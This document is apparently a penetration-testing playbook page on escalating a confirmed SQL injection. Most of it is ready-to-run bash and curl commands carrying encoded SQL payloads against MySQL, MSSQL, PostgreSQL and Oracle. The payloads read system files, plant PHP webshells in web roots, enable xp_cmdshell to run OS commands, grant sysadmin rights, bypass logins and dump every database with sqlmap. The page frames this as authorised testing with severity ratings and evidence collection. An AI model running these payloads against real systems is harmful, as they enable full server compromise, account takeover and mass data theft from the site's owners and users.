# SQL Injection — Impact Escalation

## Purpose
Maximize severity of confirmed SQLi. Escalate from data extraction to OS command execution, webshell deployment, authentication bypass, and full server compromise. Demonstrate the worst-case impact.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$DB_TYPE` — fingerprinted database
- `$OUTDIR` — output root

## Commands

### E1 — Read Local Filesystem

```bash
# MySQL LOAD_FILE
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -\"))")
curl -s "$TARGET_URL${ENC}" > "$OUTDIR/sqli/impact_etc_passwd.txt"

# MSSQL bulk file read
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UNION SELECT BulkColumn,NULL,NULL FROM OPENROWSET(BULK 'C:\\\\Windows\\\\win.ini', SINGLE_CLOB) AS x--\"))")
curl -s "$TARGET_URL${ENC}" > "$OUTDIR/sqli/impact_win_ini.txt"

# PostgreSQL COPY
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; CREATE TEMP TABLE t1(t text); COPY t1 FROM '/etc/passwd'; SELECT * FROM t1--\"))")
curl -s "$TARGET_URL${ENC}" > "$OUTDIR/sqli/impact_pg_passwd.txt"
```

### E2 — Write Files to Disk (Webshell Deployment)

```bash
# MySQL INTO OUTFILE webshell
WEBSHELL="<?php system(\$_GET['cmd']); ?>"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; SELECT '${WEBSHELL}' INTO OUTFILE '/var/www/html/shell.php'-- -\"))")
curl -s "$TARGET_URL${ENC}" -o /dev/null -w "HTTP %{http_code} | File write attempt\n"

# MSSQL xp_cmdshell for file write
# Enable xp_cmdshell first if needed
ENABLE_CMD=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--\"))")
curl -s "$TARGET_URL${ENABLE_CMD}" -o /dev/null

# Write webshell via xp_cmdshell
WRITE_WS=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; EXEC xp_cmdshell 'echo ^<^?php system($^^_GET[cmd]); ^?^> > C:\\\\inetpub\\\\wwwroot\\\\shell.php'--\"))")
curl -s "$TARGET_URL${WRITE_WS}" -o /dev/null

# PostgreSQL COPY TO PROGRAM
PG_WRITE=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; COPY (SELECT '<?php system(\\\\$_GET[cmd]); ?>') TO '/var/www/html/shell.php'--\"))")
curl -s "$TARGET_URL${PG_WRITE}" -o /dev/null
```

### E3 — OS Command Execution

```bash
# MSSQL xp_cmdshell
CMD_WHOAMI=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; EXEC xp_cmdshell 'whoami'--\"))")
curl -s "$TARGET_URL${CMD_WHOAMI}" > "$OUTDIR/sqli/impact_os_whoami.txt"

CMD_DIR=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; EXEC xp_cmdshell 'dir C:\\\\'--\"))")
curl -s "$TARGET_URL${CMD_DIR}" > "$OUTDIR/sqli/impact_os_dir.txt"

# PostgreSQL COPY TO PROGRAM
PG_ID=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; COPY (SELECT '') TO PROGRAM 'id'--\"))")
curl -s "$TARGET_URL${PG_ID}" > "$OUTDIR/sqli/impact_pg_id.txt"

# Oracle DBMS_SCHEDULER (if Java/EXECUTABLE job type available)
ORA_EXEC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'JX',job_type=>'EXECUTABLE',job_action=>'/bin/id',enabled=>TRUE);END;--\"))")
curl -s "$TARGET_URL${ORA_EXEC}" -o /dev/null
```

### E4 — Full Database Exfiltration (sqlmap automation)

```bash
# Dump ALL databases
sqlmap -u "$TARGET_URL" --batch --dbs --dump-all --threads=5 --exclude-sysdbs -o "$OUTDIR/sqli/impact_fulldump/" 2>&1 | tee "$OUTDIR/sqli/impact_fulldump_output.txt"
```

### E5 — Authentication Bypass

```bash
# Classic login bypass (if login form feeds SQL with concatenation)
BYPASS_USER="admin'-- -"
BYPASS_PASS="anything"

curl -s -X POST "$TARGET_URL/login" \
  -d "username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${BYPASS_USER}'))")&password=${BYPASS_PASS}" \
  -c "$OUTDIR/sqli/bypass_jar.txt" -o "$OUTDIR/sqli/bypass_response.txt"

# Check for successful redirect (302 or dashboard content)
grep -c 'dashboard\|welcome\|profile\|account' "$OUTDIR/sqli/bypass_response.txt" && \
  echo "[!] Authentication bypass confirmed — admin access without valid credentials" | tee -a "$OUTDIR/sqli/impact_auth_bypass.txt"
```

### E6 — Privilege Escalation via SQLi

```bash
# MySQL — check FILE privilege
MYSQL_PRIV="' UNION SELECT CONCAT(user,':',file_priv),NULL,NULL FROM mysql.user-- -"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${MYSQL_PRIV}'))")
curl -s "$TARGET_URL${ENC}" > "$OUTDIR/sqli/impact_privileges.txt"

# MSSQL — add user to sysadmin role
MSSQL_SYSADMIN=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; EXEC sp_addsrvrolemember 'DOMAIN\\\\user','sysadmin'--\"))")
curl -s "$TARGET_URL${MSSQL_SYSADMIN}" -o /dev/null
```

### E7 — Severity Classification

```bash
cat > "$OUTDIR/sqli/severity_rating.md" << 'SEVEOF'
| Condition | Technique | Severity |
|---|---|---|
| Error visible + data extracted | Error-based extraction | Critical |
| Blind + data extracted | Boolean/Time blind | High |
| UNION with data rows returned | UNION-based | Critical |
| Stacked queries working | Stacked + multi-statement | Critical |
| File read achieved | LOAD_FILE/BULK/COPY | Critical |
| File write / webshell deployed | INTO OUTFILE/xp_cmdshell | Critical |
| OS command execution | xp_cmdshell/COPY TO PROGRAM | Critical |
| Full database dump | sqlmap --dump-all | Critical |
| Auth bypass (admin access) | OR 1=1 login bypass | High |
SEVEOF
```

## Detection Signals
- `etc/passwd` or equivalent retrieved → file read confirmed
- Webshell accessible at predicted URL → file write + remote code execution
- `whoami` output captured → OS command execution confirmed
- sqlmap completes full dump → mass data exfiltration demonstrated
- Login redirects to dashboard → authentication bypass working

## False Positives
- FILE privilege missing → file read/write won't work; test privilege first
- xp_cmdshell disabled → command exec won't work until enabled (and may be audited)
- INTO OUTFILE path unknown → webshell write needs known web root; probe with directory traversal
- Authentication bypass "works" but session has no privileges → verify access to admin functionality

## Next
├── If command execution achieved → go to `05-evidence-collection.md`
├── If data dumped → redact sensitive data and proceed to `05-evidence-collection.md`
├── If webshell deployed → verify reachability and capture evidence
└── Always → classify severity before evidence collection